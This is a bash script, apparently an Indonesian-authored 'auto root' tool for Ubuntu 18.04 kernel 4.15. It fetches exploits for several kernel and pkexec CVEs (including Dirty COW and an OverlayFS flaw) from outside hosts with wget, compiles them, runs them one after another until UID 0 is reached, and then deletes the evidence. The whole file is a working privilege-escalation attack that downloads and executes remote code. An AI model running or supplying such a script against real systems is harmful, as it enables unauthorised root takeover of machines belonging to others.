#!/bin/bash
RED='\033[91m'; GREEN='\033[92m'; END='\033[0m'
echo "***************************************************************"
echo -e "${RED}Auto Root Kernel 4.15.0-192 (Ubuntu 18.04) by BATOSAY1337${END}"
echo "***************************************************************"

check_root(){
  if [ "$(id -u)" -eq 0 ]; then
    echo -e "${GREEN}[+] ROOT achieved! UID=$(id -u)${END}"
    exit
  fi
}

try_bin(){
  NAME="$1"; URL="$2"
  echo "[*] Downloading $NAME..."
  wget -q "$URL" -O "$NAME"
  if [[ ! -f "$NAME" ]]; then
    echo "[!] Failed to download $NAME"
    return
  fi
  chmod +x "$NAME"
  echo "[*] Running $NAME..."
  ./"$NAME" || true
  check_root
  rm -f "$NAME"
}

try_c(){
  NAME="$1.cpp"; BIN="$1"; URL="$2"
  echo "[*] Downloading C exploit $NAME..."
  wget -q "$URL" -O "$NAME"
  if [[ ! -f "$NAME" ]]; then
    echo "[!] Failed to download $NAME"
    return
  fi
  g++ -o "$BIN" "$NAME" 2>/dev/null && {
    echo "[*] Running $BIN..."
    ./"$BIN" || true
    check_root
    rm -f "$NAME" "$BIN"
  } || {
    echo "[!] Compile failed for $NAME"
    rm -f "$NAME"
  }
}

# 1. Nested User Namespace idmap (CVE-2018-18955)
try_c cve-2018-18955 "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886"

# 2. PTRACE_TRACEME pkexec (CVE-2019-13272)
try_c ptrace-traceme "https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47163"

# 3. Dirty COW (CVE-2016-5195)
try_c dirtycow "https://gist.githubusercontent.com/v1ad/90b77ae3d87485c4629d/raw/CVE-2016-5195.c"

# 4. OverlayFS / CVE-2021-3493 (Ubuntu-specific)
try_c overlayfs "https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit"

echo -e "${RED}[!] Semua exploit sudah dijalankan. Jika belum root, kemungkinan sudah patched.${END}"
